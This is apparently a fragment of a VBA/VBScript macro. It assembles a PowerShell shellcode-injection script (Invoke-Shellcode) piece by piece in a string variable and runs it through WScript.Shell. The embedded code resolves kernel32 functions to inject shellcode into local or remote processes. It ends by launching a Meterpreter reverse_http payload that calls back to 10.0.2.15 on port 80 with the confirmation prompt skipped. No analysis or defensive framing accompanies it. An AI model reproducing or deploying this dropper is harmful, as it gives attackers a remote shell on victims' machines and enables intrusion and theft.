        OJ = OJ + "moteThreadAddr, $CreateRemoteThreadDelegate)
     "
        OJ = OJ + "   $CloseHandleAddr = Get-ProcAddress kernel32.dll"
        OJ = OJ + " CloseHandle
        $CloseHandleDelegate = Get-De"
        OJ = OJ + "legateType @([IntPtr]) ([Bool])
        $CloseHand"
        OJ = OJ + "le = [System.Runtime.InteropServices.Marshal]::Get"
        OJ = OJ + "DelegateForFunctionPointer($CloseHandleAddr, $Clos"
        OJ = OJ + "eHandleDelegate)
        if ( $Force -or $psCmdlet"
        OJ = OJ + ".ShouldContinue( 'Do you wish to carry out your ev"
        OJ = OJ + "il plans?',
                 "Injecting shellcode "
        OJ = OJ + "injecting into $((Get-Process -Id $ProcessId).Proc"
        OJ = OJ + "essName) ($ProcessId)!" ) )
        {
            "
        OJ = OJ + "Inject-RemoteShellcode $ProcessId
        }
    }
"
        OJ = OJ + "    else
    {
        $VirtualAllocAddr = Get-Pro"
        OJ = OJ + "cAddress kernel32.dll VirtualAlloc
        $Virtua"
        OJ = OJ + "lAllocDelegate = Get-DelegateType @([IntPtr], [UIn"
        OJ = OJ + "t32], [UInt32], [UInt32]) ([IntPtr])
        $Virt"
        OJ = OJ + "ualAlloc = [System.Runtime.InteropServices.Marshal"
        OJ = OJ + "]::GetDelegateForFunctionPointer($VirtualAllocAddr"
        OJ = OJ + ", $VirtualAllocDelegate)
        $VirtualFreeAddr "
        OJ = OJ + "= Get-ProcAddress kernel32.dll VirtualFree
       "
        OJ = OJ + " $VirtualFreeDelegate = Get-DelegateType @([IntPtr"
        OJ = OJ + "], [Uint32], [UInt32]) ([Bool])
        $VirtualFr"
        OJ = OJ + "ee = [System.Runtime.InteropServices.Marshal]::Get"
        OJ = OJ + "DelegateForFunctionPointer($VirtualFreeAddr, $Virt"
        OJ = OJ + "ualFreeDelegate)
        $CreateThreadAddr = Get-P"
        OJ = OJ + "rocAddress kernel32.dll CreateThread
        $Crea"
        OJ = OJ + "teThreadDelegate = Get-DelegateType @([IntPtr], [U"
        OJ = OJ + "Int32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) (["
        OJ = OJ + "IntPtr])
        $CreateThread = [System.Runtime.I"
        OJ = OJ + "nteropServices.Marshal]::GetDelegateForFunctionPoi"
        OJ = OJ + "nter($CreateThreadAddr, $CreateThreadDelegate)
   "
        OJ = OJ + "     $WaitForSingleObjectAddr = Get-ProcAddress ke"
        OJ = OJ + "rnel32.dll WaitForSingleObject
        $WaitForSin"
        OJ = OJ + "gleObjectDelegate = Get-DelegateType @([IntPtr], ["
        OJ = OJ + "Int32]) ([Int])
        $WaitForSingleObject = [Sy"
        OJ = OJ + "stem.Runtime.InteropServices.Marshal]::GetDelegate"
        OJ = OJ + "ForFunctionPointer($WaitForSingleObjectAddr, $Wait"
        OJ = OJ + "ForSingleObjectDelegate)
        if ( $Force -or $"
        OJ = OJ + "psCmdlet.ShouldContinue( 'Do you wish to carry out"
        OJ = OJ + " your evil plans?',
                 "Injecting sh"
        OJ = OJ + "ellcode into the running PowerShell process!" ) )
"
        OJ = OJ + "        {
            Inject-LocalShellcode
      "
        OJ = OJ + "  }
    }
}
Invoke-Shellcode -Payload windows/mete"
        OJ = OJ + "rpreter/reverse_http -Lhost 10.0.2.15 -Lport 80 -F"
        OJ = OJ + "orce"
        Set asd = CreateObject("WScript.Shell")
        asd.Run(OJ)
End Function
